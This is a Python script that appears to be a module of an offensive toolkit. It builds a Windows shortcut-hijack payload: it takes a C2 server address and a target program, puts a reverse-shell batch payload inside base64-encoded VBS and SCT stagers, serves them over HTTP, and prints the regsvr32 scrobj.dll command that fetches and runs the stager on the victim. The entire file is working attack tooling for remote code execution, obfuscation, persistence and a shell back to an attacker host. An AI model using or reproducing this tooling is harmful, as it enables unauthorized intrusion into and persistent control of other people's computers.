import base64 as b64
import codecs
from colorama import Fore
import subprocess
import os
import sys
import string
import random

def set_ip():
   IP = input(Fore.YELLOW+"[-] Set IP address/FQDN of c2 server: "+Fore.LIGHTBLUE_EX)
   return IP
   
def set_port():
   port = input(Fore.YELLOW+"[-] Set port of c2 server: "+Fore.LIGHTBLUE_EX)
   return port

def set_target_path():
   target_path = input(Fore.YELLOW+"[-] Set target path to hijack (e.g. C:\Program Files\Google\Chrome\Application\chrome.exe): "+Fore.LIGHTBLUE_EX)
   return target_path
   
def set_lnk_name():
   lnk_name = input(Fore.YELLOW+"[-] Set filepath for the .lnk name: "+Fore.LIGHTBLUE_EX)
   return lnk_name
   
def get_lnk_sct_template():
   with open("LNK_HJCK_TEMPLATE.sct", "r") as FILE:
      sct_template = FILE.read()
   return sct_template
   
def get_reverse_shell_payload():
   with open("../Payloads/reverseShell.bat", "r") as FILE:
      reverse_shell = FILE.read()
   return reverse_shell 

def get_batsignal():
   with open("../Payloads/batsignal.vbs", "r") as FILE:
      batsignal = FILE.read()
   return batsignal

def save_sct(sct_template):
   with open("lnk.sct", "w") as FILE:
      FILE.write(sct_template)

def start_stager_listener(ip):
   print("[*] Starting stager on http://{}:8000...".format(ip))
   os.system("sudo ufw allow to any port 8000")
   subprocess.Popen(
      "python3 -m http.server &",
      stdin=subprocess.PIPE,
      stdout=subprocess.PIPE,
      shell=True
   )
   print(Fore.LIGHTGREEN_EX+"\n[*] stager listener started on port {}:8000...".format(ip))
   print(Fore.RESET+"[+] run 'regsvr32 /u /n /s /i:http://{}:8000/lnk.sct scrobj.dll' on the target system".format(ip))
   
   
   
if __name__=="__main__":
   if not sys.argv[1]:
      print(Fore.LIGHTRED_EX+"[!!] No stager set. Set stager before running this module...")
      print(Fore.LIGHTBLUE_EX+"Usage: python3 {} [ -stager | -local | -link < link to stager payloads e.g. gist/.../lnk.sct >]")
      sys.exit(1)
      
   ip = set_ip()
   port = set_port()
   
   target_path = set_target_path()
   lnk_name = set_lnk_name()
   
   sct_template = get_lnk_sct_template()
   
   reverse_shell = get_reverse_shell_payload()
   
   batsignal = get_batsignal()
   
   string_choices = string.ascii_letters+string.digits
   random_profile_name = ''
   for i in range(8):
      random_profile_name += random.choice(string_choices)
      
   ##replace ip and port in reverse_shell
   reverse_shell = reverse_shell.replace("IP", ip).replace("PORT", port)
   reverse_shell_b64 = b64.b64encode(reverse_shell.encode())
   
   ##inject reverse shell b64 payload into batsignal.vbs
   batsignal = batsignal.replace("[PAYLOAD]", reverse_shell_b64.decode())
   batsignal_b64 = b64.b64encode(batsignal.encode())
   
   ##inject target, lnkname, and batsignal into lnk_hjck.sct
   sct_template = sct_template.replace("[BATSIGNAL]", batsignal_b64.decode())
   sct_template = sct_template.replace("[LNKNAME]", lnk_name)
   sct_template = sct_template.replace("[TARGET]", target_path)
   sct_template = sct_template.replace("[RANDOM]", random_profile_name)
   
   ##save lnk hijack sct file
   save_sct(sct_template) 
   
   if sys.argv[1] == "-stager":
      start_stager_listener(ip)
   elif sys.argv[1] == "-local":
      print("[-] Download lnk.sct onto the target system...")
      print("[-] Execute the following command on the target system: 'regsvr32 /u /n /s /i:<path to lnk.sct on target system> scrobj.dll'")
   elif sys.argv[1] == "-link":
      gist = input("[-] Enter link/gist for stager: ")
      print("[-] Execute the following command on the target system: 'regsvr32 /u /n /s /i:<path to lnk.sct on target system> scrobj.dll'")
      print(Fore.RESET+"[+] run 'regsvr32 /u /n /s /i:{} scrobj.dll' on the target system".format(gist))
   
   #print(Fore.GREEN+"\n[+] run 'sudo ufw allow to any port 8000 && python -m SimpleHTTPServer' on this machine...")


   
